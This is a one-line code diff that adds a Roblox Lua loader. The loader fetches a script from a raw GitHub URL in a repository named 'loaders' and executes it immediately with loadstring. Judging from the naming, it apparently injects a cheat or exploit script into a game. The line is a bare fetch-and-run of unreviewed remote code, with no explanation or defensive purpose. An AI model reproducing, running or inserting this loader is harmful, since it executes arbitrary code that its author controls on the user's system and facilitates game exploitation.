@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/my-anime-mine-spam5-tw534p2pgdvna7.lua"))()
